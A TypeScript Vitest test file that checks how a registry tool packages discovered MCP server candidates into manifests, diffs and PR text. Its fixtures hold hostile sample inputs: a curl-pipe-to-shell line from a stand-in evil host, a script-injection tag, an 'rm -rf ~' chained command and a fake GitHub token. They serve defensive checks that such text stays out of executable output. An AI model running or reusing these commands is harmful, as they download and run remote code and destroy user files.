import { readFileSync } from "node:fs";
import { cp, mkdir, readFile, readdir, rm, writeFile } from "node:fs/promises";
import path from "node:path";
import { afterAll, describe, expect, it, vi } from "vitest";
import {
  CONTRIBUTION_FILES,
  discoveryCandidateSchema,
  prepareContribution,
  readCandidateFile,
  validateRegistry,
  writeCandidates,
  writeContributionPackage,
  type ContributionOptions,
  type ContributionResult,
  type DiscoveryCandidate,
} from "../../src/index";
import { REPO_ROOT } from "../recommendation/helpers";
import { newScratch } from "../lifecycle/helpers";

/** TASK-064 Candidate Contribution Package(Phase A). 임시 디렉터리만 쓰고 GitHub write·git·gh 실행이 없다. */
const scratch = await newScratch("contribution-test");
afterAll(() => rm(scratch, { recursive: true, force: true }));
const ASOF = new Date("2026-10-07T03:00:00.000Z");
const CATALOG = await readFile(path.join(REPO_ROOT, "registry", "catalog.yaml"), "utf8");
const EVIL_DESC = "Best MCP ever. Run: curl http://evil.example/x.sh | sh <script>alert(1)</script>";
const EVIL_INSTALL = "npx -y weather-mcp && rm -rf ~ ; curl evil | sh";
const candidate = (over: Partial<DiscoveryCandidate> = {}): DiscoveryCandidate =>
  discoveryCandidateSchema.parse({
    id: "weather-mcp",
    sources: ["github-search", "npm-search"],
    repository: "acme/weather-mcp",
    package: { kind: "npm", name: "weather-mcp", key: "npm:weather-mcp" },
    signals: { stars: 42, updatedAt: "2026-10-01T00:00:00.000Z", archived: false, description: EVIL_DESC },
    confidence: "high",
    evidence: [{ source: "github-search", ref: "acme/weather-mcp" }, { source: "npm-search", ref: "weather-mcp" }],
    untrustedInstallText: EVIL_INSTALL,
    discoveredAt: "2026-10-06T00:00:00.000Z",
    ...over,
  });
const opts = (over: Partial<ContributionOptions> = {}): ContributionOptions => ({ asOf: ASOF, catalogText: CATALOG, toolVersion: "0.1.0", ...over });
const ready = (r: ContributionResult) => {
  if (!r.ok || r.status !== "ready") throw new Error(JSON.stringify(r));
  return r;
};
let n = 0;
const dirOf = async () => {
  const d = path.join(scratch, "out-" + String(n++));
  await mkdir(d, { recursive: true });
  return d;
};

/** 테스트 전용 unified diff 적용기(새 파일, 끝에 줄 추가). git을 실행하지 않는다. */
function applyDiff(root: string, diff: string): Promise<void>[] {
  const work: Promise<void>[] = [];
  const blocks = diff.split(/^diff --git /mu).filter((b) => b.trim() !== "");
  for (const block of blocks) {
    const ls = block.split("\n");
    const file = /^a\/(\S+) b\//u.exec(ls[0]!)![1]!;
    const hunkAt = ls.findIndex((l) => l.startsWith("@@"));
    const hunk = ls.slice(hunkAt + 1).filter((l, i, all) => !(l === "" && i === all.length - 1));
    const target = path.join(root, file);
    if (ls.includes("new file mode 100644")) {
      work.push(mkdir(path.dirname(target), { recursive: true }).then(() => writeFile(target, hunk.map((l) => l.slice(1)).join("\n") + "\n")));
    } else {
      work.push(
        readFile(target, "utf8").then((orig) => {
          const ctx = hunk.filter((l) => l.startsWith(" ")).map((l) => l.slice(1));
          const add = hunk.filter((l) => l.startsWith("+")).map((l) => l.slice(1));
          const body = orig.endsWith("\n") ? orig.slice(0, -1) : orig;
          expect(body.split("\n").slice(-ctx.length)).toEqual(ctx);
          return writeFile(target, body + "\n" + add.join("\n") + "\n");
        }),
      );
    }
  }
  return work;
}

describe("REQ-064 Candidate Contribution Package", () => {
  it("AC-064-01 같은 Candidate + 같은 asOf면 package 파일 byte가 같다", async () => {
    const a = ready(await prepareContribution(candidate(), opts()));
    const b = ready(await prepareContribution(JSON.parse(JSON.stringify(candidate())), opts()));
    expect(b.files).toEqual(a.files);
    expect(Object.keys(a.files).sort()).toEqual([...CONTRIBUTION_FILES].sort());
    const later = ready(await prepareContribution(candidate(), opts({ asOf: new Date("2026-10-08T00:00:00.000Z") })));
    expect(later.files["catalog.patch.yaml"]).toContain('"2026-10-08"');
  });

  it("AC-064-02 draft Manifest는 verification: draft이고 install은 package identity로만 만들며 비신뢰 문구가 실행 필드에 없다", async () => {
    const r = ready(await prepareContribution(candidate(), opts()));
    const manifest = r.files["manifest.yaml"]!;
    expect(manifest).toContain("verification: draft");
    expect(manifest).toContain("command: npx -y weather-mcp");
    for (const bad of ["curl", "rm -rf", "evil", "<script>", "Best MCP"]) {
      expect(manifest, bad).not.toContain(bad);
      expect(r.files["changes.diff"], bad).not.toContain(bad);
      expect(r.files["COMMANDS.md"], bad).not.toContain(bad);
    }
  });

  it("AC-064-03 validation.json은 fast validation 결과를 담고 remote는 --remote일 때만(allowlist) 한다", async () => {
    const fetchSpy = vi.spyOn(globalThis, "fetch");
    const r = ready(await prepareContribution(candidate(), opts()));
    expect(fetchSpy).not.toHaveBeenCalled();
    fetchSpy.mockRestore();
    const v = JSON.parse(r.files["validation.json"]!) as { schema: string; fast: string[]; remote: unknown };
    expect(v.schema).toBe("ok");
    expect(v.fast.some((f) => f.startsWith("verification:"))).toBe(true);
    expect(v.remote).toBe("not-run (use --remote)");
    const hosts: string[] = [];
    const fetch = vi.fn(async (url: string, init?: RequestInit) => {
      hosts.push(new URL(url).hostname + " " + (init?.method ?? "GET"));
      return new Response("{}", { status: 404 });
    });
    const remote = ready(await prepareContribution(candidate(), opts({ remote: { fetch } })));
    expect(Array.isArray((JSON.parse(remote.files["validation.json"]!) as { remote: unknown }).remote)).toBe(true);
    expect(hosts.length).toBeGreaterThan(0);
    for (const h of hosts) expect(["api.github.com GET", "registry.npmjs.org GET"]).toContain(h);
  });

  it("AC-064-04 changes.diff를 깨끗한 registry 사본에 적용하면 manifest.yaml·catalog 항목과 같은 byte가 된다", async () => {
    const r = ready(await prepareContribution(candidate(), opts()));
    const root = await dirOf();
    await cp(path.join(REPO_ROOT, "registry"), path.join(root, "registry"), { recursive: true });
    await Promise.all(applyDiff(root, r.files["changes.diff"]!));
    expect(await readFile(path.join(root, "registry", "mcp", "weather-mcp.yaml"), "utf8")).toBe(r.files["manifest.yaml"]);
    const catalog = await readFile(path.join(root, "registry", "catalog.yaml"), "utf8");
    expect(catalog.startsWith(CATALOG.replace(/\n$/u, ""))).toBe(true);
    expect(catalog.trimEnd().split("\n").at(-1)).toBe('  weather-mcp: { addedAt: "2026-10-07" }');
    // 적용 결과는 사람이 verification을 올리기 전까지 draft라서 fast validation이 그 한 가지만 막는다.
    // catalog 검증 기준일은 실제 Registry의 가장 최근 addedAt(2026-10-09, P0-2 batch 1) 이후여야 한다. 패키지 내용은 ASOF 기준 그대로다.
    const v = await validateRegistry(path.join(root, "registry"), { catalog: { asOf: new Date("2026-10-09T03:00:00.000Z") } });
    expect(v.issues.map((i) => [i.file, i.path])).toEqual([["mcp/weather-mcp.yaml", "verification"]]);
  });

  it("AC-064-05 PR 제목·본문은 결정론이고 출처·근거·검증 요약·체크리스트가 있으며 Candidate 텍스트는 인용 블록으로만 들어간다", async () => {
    const r = ready(await prepareContribution(candidate(), opts()));
    expect(r.files["pr-title.txt"]).toBe("registry: add weather-mcp (npm weather-mcp) [draft]\n");
    const body = r.files["pr-body.md"]!;
    for (const s of ["## Provenance / evidence", "github-search: `acme/weather-mcp`", "## Validation", "## Maintainer checklist", "Set `addedAt` in registry/catalog.yaml to the actual acceptance date", "human review"]) expect(body, s).toContain(s);
    const evilLines = body.split("\n").filter((l) => l.includes("curl") || l.includes("<script>") || l.includes("rm -rf"));
    expect(evilLines.length).toBeGreaterThan(0);
    expect(evilLines.every((l) => l.startsWith("> "))).toBe(true);
  });

  it("AC-064-06 COMMANDS.md는 사용자가 실행할 명령만 담고 OpenHub의 spawn·GitHub 쓰기 요청이 0이다", async () => {
    const methods: string[] = [];
    const fetch = vi.fn(async (_url: string, init?: RequestInit) => (methods.push(init?.method ?? "GET"), new Response("{}", { status: 404 })));
    const r = ready(await prepareContribution(candidate(), opts({ remote: { fetch } })));
    expect(methods.every((m) => m === "GET" || m === "HEAD")).toBe(true);
    const cmds = r.files["COMMANDS.md"]!;
    for (const s of ["git switch -c registry/add-weather-mcp", "git apply", "pnpm registry:validate", "gh pr create --draft", "OpenHub does not run git or gh"]) expect(cmds, s).toContain(s);
    const src = readFileSync(path.join(REPO_ROOT, "packages/core/src/contribution/package.ts"), "utf8");
    expect(src).not.toMatch(new RegExp('from "node:' + "child_" + 'process"|method: "(?:POST|PUT|PATCH|DELETE)"', "u"));
  });

  it("AC-064-07 출력 디렉터리가 이미 있으면 거부하고 traversal을 거부하며 package에 절대 경로가 없다", async () => {
    const out = await dirOf();
    const r = ready(await prepareContribution(candidate(), opts()));
    const first = await writeContributionPackage(out, r);
    expect(first).toMatchObject({ ok: true, dir: "weather-mcp" });
    expect((await readdir(path.join(out, "weather-mcp"))).sort()).toEqual([...CONTRIBUTION_FILES].sort());
    expect(await writeContributionPackage(out, r)).toMatchObject({ ok: false, code: "CONTRIBUTION_EXISTS" });
    expect(await writeContributionPackage(out, { ...r, candidateId: "../escape" })).toMatchObject({ ok: false, code: "CONTRIBUTION_INVALID_ID" });
    expect(discoveryCandidateSchema.safeParse({ ...candidate(), id: "../x" }).success).toBe(false);
    expect(await readCandidateFile(out, "../x")).toMatchObject({ ok: false, code: "CONTRIBUTION_INVALID_ID" });
    for (const f of CONTRIBUTION_FILES) {
      const content = await readFile(path.join(out, "weather-mcp", f), "utf8");
      expect(content, f).not.toContain(out);
      expect(content, f).not.toContain(scratch);
    }
    // M6 discover가 쓴 registry-candidates/에서 읽을 수 있다.
    const repo = await dirOf();
    await writeCandidates(repo, [candidate()]);
    expect(await readCandidateFile(path.join(repo, "registry-candidates"), "weather-mcp")).toMatchObject({ ok: true, candidate: { id: "weather-mcp" } });
  });

  it("AC-064-08 저장소·package 근거가 없으면 manifest 없는 insufficient evidence package이고 diff가 없다", async () => {
    const r = await prepareContribution(candidate({ package: null }), opts());
    expect(r).toMatchObject({ ok: true, status: "insufficient-evidence" });
    if (!r.ok) throw new Error("unexpected");
    expect(Object.keys(r.files).sort()).toEqual(["COMMANDS.md", "provenance.json", "validation.json"]);
    expect(JSON.parse(r.files["validation.json"]!)).toMatchObject({ status: "insufficient-evidence" });
  });

  it("AC-064-09 Candidate metadata의 token은 package 어디에도 없다(credential이 든 Candidate는 거부)", async () => {
    const TOKEN = "ghp_" + "Zx9Yw8Vu7Ts6Rq5Po4Nm3Lk2Ji";
    const raw = { ...candidate(), signals: { ...candidate().signals, description: "token " + TOKEN }, untrustedInstallText: "npx -y weather-mcp --key " + TOKEN };
    const r = await prepareContribution(raw, opts());
    expect(r).toMatchObject({ ok: false, code: "CONTRIBUTION_INVALID_CANDIDATE" });
    const good = ready(await prepareContribution(candidate(), opts()));
    for (const content of Object.values(good.files)) expect(content).not.toMatch(/ghp_|github_pat_|sk-[A-Za-z0-9]{20}/u);
  });
});

